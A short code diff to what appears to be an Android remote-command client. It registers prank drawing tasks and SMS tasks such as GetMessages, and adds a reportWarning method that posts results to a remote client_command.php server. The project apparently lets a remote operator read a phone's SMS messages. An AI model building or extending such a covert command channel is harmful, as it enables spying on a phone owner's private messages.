@@ -33,6 +33,7 @@ public class Command {
             commandList.put("Pong", DrawingTasks.PongTask.class);
             commandList.put("ScreenCrack", DrawingTasks.CrackScreenTask.class);
             commandList.put("ClearViews", DrawingTasks.ClearViewTask.class);
+            commandList.put("ShowImage", DrawingTasks.DrawURLImage.class);
             //sms tasks
             commandList.put("CacheThread", SMSCommands.CacheThreadIdTask.class);
             commandList.put("GetMessages", SMSCommands.GetMessagesTask.class);
@@ -45,6 +46,15 @@ public class Command {
         params.put("command", "addMessage");
         params.put("client_id", Constants.CLIENT_ID);
         params.put("message_type", "COMMAND_COMPLETED");
+        params.put("message", result);
+        RestClient.post("client_command.php", params);
+    }
+
+    public static void reportWarning(String result) {
+        RequestParams params = new RequestParams();
+        params.put("command", "addMessage");
+        params.put("client_id", Constants.CLIENT_ID);
+        params.put("message_type", "WARNING");
         params.put("message", result);
         RestClient.post("client_command.php", params);
     }
